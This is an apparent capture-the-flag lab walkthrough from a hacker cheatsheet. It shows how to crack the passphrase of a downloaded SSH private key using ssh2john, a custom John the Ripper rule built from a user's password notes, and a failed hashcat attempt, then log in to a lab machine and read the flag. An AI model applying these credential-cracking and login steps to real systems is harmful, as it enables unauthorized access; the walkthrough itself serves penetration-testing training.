# SSH Private Key Passphrase

Directory Listing of TinyFileManager
>![](https://raw.githubusercontent.com/caderob/hacker-cheatsheet/main/Images/SSH-Private-Key-Passphrase-1.png)

Contents of note.txt
>``` shell
>kali@kali:~/passwordattacks$ cat note.txt
>
># ========== Expected Result ==========
>Dave's password list:
>
>Window
>rickc137
>dave
>superdave
>megadave
>umbrella
>
>Note to myself:
>New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
># =====================================
>```

SSH connection attempts with the private key
>``` shell
>kali@kali:~/passwordattacks$ chmod 600 id_rsa
>
>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
>
># ========== Expected Result ==========
>The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be established.
>ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
>This key is not known by any other names
>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
>Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known hosts.
>Enter passphrase for key 'id_rsa':
>Enter passphrase for key 'id_rsa':
>Enter passphrase for key 'id_rsa':
>dave@192.168.50.201's password: 
># =====================================
>
>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
>
># ========== Expected Result ==========
>Enter passphrase for key 'id_rsa':
>Enter passphrase for key 'id_rsa':
>Enter passphrase for key 'id_rsa':
># =====================================
>```

Using ssh2john to format the hash
>``` shell
>kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
>
>kali@kali:~/passwordattacks$ cat ssh.hash
>
># ========== Expected Result ==========
>id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
># =====================================
>```

Determine the correct mode for Hashcat
>``` shell
>kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh" 
>
># ========== Expected Result ==========
>...
>  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
>  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
>  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key
>  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
>  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
>  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key
># =====================================
>```

Contents of note.txt to determine rules and wordlist
>``` shell
>kali@kali:~/passwordattacks$ cat note.txt
>
># ========== Expected Result ==========
>Dave's password list:
>
>Window
>rickc137
>dave
>superdave
>megadave
>umbrella
>
>Note to myself:
>New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
># =====================================
>```

Contents of the ssh.rule rules file
>``` shell
>kali@kali:~/passwordattacks$ cat ssh.rule
>
># ========== Expected Result ==========
>c $1 $3 $7 $!
>c $1 $3 $7 $@
>c $1 $3 $7 $#
># =====================================
>```

Contents of the ssh.passwords wordlist
>``` shell
>kali@kali:~/passwordattacks$ cat ssh.passwords
>
># ========== Expected Result ==========
>Window
>rickc137
>dave
>superdave
>megadave
>umbrella
># =====================================
>```

Failed cracking attempt with Hashcat
>``` shell
>kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
>
># ========== Expected Result ==========
>hashcat (v6.2.5) starting
>...
>
>Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
>No hashes loaded.
>...
># =====================================
>```

Adding the named rules to the JtR configuration file
>``` shell
>kali@kali:~/passwordattacks$ cat ssh.rule
>
># ========== Expected Result ==========
>[List.Rules:sshRules]
>c $1 $3 $7 $!
>c $1 $3 $7 $@
>c $1 $3 $7 $#
># =====================================
>
>kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
>```

Cracking the hash with JtR
>``` shell
>kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
>
># ========== Expected Result ==========
>Using default input encoding: UTF-8
>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
>Cost 2 (iteration count) is 16 for all loaded hashes
>Will run 4 OpenMP threads
>Press 'q' or Ctrl-C to abort, almost any other key for status
>Umbrella137!     (?)     
>1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14c/s 32.14C/s Window137!..Umbrella137#
>Use the "--show" option to display all of the cracked passwords reliably
>Session completed. 
># =====================================
>```

Entering Passphrase to connect to the target system with SSH
>``` shell
>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
>
># ========== Expected Result ==========
>Enter passphrase for key 'id_rsa':
>Welcome to Alpine!
>
>The Alpine Wiki contains a large amount of how-to guides and general
>information about administrating Alpine systems.
>See <http://wiki.alpinelinux.org/>.
>
>You can setup the system with the command: setup-alpine
>
>You may change this message by editing /etc/motd.
>
>0d6d28cfbd9c:~$
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to get access to VM #1 (BRUTE) on port 2222 with SSH by cracking the passphrase of the private key. Find the flag in the home directory of the user dave.
>``` shell
># Open the web application in a browser (http://192.168.213.201:8080)
>
># Log in using provided credentials
>Username: user
>Password: 121212
>
># Download the files from the web app
>note.txt
>id_rsa
>
># Fix private key permissions
>kali@kali:~/passwordattacks$ chmod 600 id_rsa
>
># Attempt SSH Login (Confirm Passphrase Protection)
>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.213.201
>
># ========== Expected Result ==========
>Enter passphrase for key 'id_rsa':
># =====================================
>
># Convert the private key into John format
>kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
>
># Verify the hash file
>kali@kali:~/passwordattacks$ cat ssh.hash
>
># ========== Expected Result ==========
>id_rsa:$sshng$6$16$...
># =====================================
>
># Read the note file
>kali@kali:~/passwordattacks$ cat note.txt
>
>># ========== Expected Result ==========
>Dave's password list:
>
>Window
>rickc137
>dave
>superdave
>megadave
>umbrella
>
>Note to myself:
>New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
># =====================================
>
># Create a wordlist based on note.txt
>kali@kali:~/passwordattacks$ cat > ssh.passwords << EOF
>Window
>rickc137
>dave
>superdave
>megadave
>umbrella
>EOF
>
># Create a rules file
>kali@kali:~/passwordattacks$ cat > ssh.rule << EOF
>[List.Rules:sshRules]
>c $1 $3 $7 $!
>c $1 $3 $7 $@
>c $1 $3 $7 $#
>EOF
>
># Add rules to John configuration
>kali@kali:~/passwordattacks$ sudo sh -c 'cat ssh.rule >> /etc/john/john.conf'
>
># Crack the SSH Key Passphrase
>kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
>
># ========== Expected Result ==========
>...
>Umbrella137!
>...
># =====================================
>
># Display cracked password
>kali@kali:~/passwordattacks$ john --show ssh.hash
>
># ========== Expected Result ==========
>id_rsa:Umbrella137!
># =====================================
>
># SSH into the Target as dave
>kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.213.201
>
># Retrieve the Flag
>cd ~
>ls
>cat flag.txt
>```
>OS{03d37f8c50b70ae5e29f770f8e6b9b72}

Lab 2 - Enumerate VM #1 and find a way to get access to SSH on port 2223. Find the flag in the home directory of the user alfred. You can use the same rules we created in this section.
>``` shell
>
>```
>

